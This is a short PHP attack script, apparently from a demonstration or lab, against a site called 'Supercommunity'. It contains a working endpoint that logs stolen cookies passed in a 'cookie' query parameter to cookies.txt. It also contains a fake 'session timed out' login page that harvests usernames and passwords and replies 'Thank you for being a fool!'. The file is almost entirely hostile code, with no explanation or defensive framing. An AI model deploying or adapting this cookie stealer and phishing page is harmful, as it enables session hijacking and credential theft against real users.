<?php
if(isset($_GET['cookie'])) {
  $cookie = $_GET['cookie'];
  $f = fopen("cookies.txt","a");
  fwrite($f, urldecode($cookie) . "\r\n");
  fclose($f);
} else if(isset($_POST['user']) && isset($_POST['pass'])) {
	echo "Thank you for being a fool!<br />";
	echo "do_evil_stuff_here()";
} else {
?>
<html>
<head><title>Supercommunity</title></head>
<body style="background-color: #BBBBBB;" >
<div style="width: 800px; min-height: 400px; margin-left: auto; margin-right: auto; border: 1px solid #000000;">
<b>Your session has timed out, please log in again</b><br />
<form action="attack.php" method="post">
Username:<input type="text" name="user" /><br />
Password:<input type="password" name="pass" /><br />
<input type="submit" />
</form>
</div>
</body>
</html>
<?php
}
?>
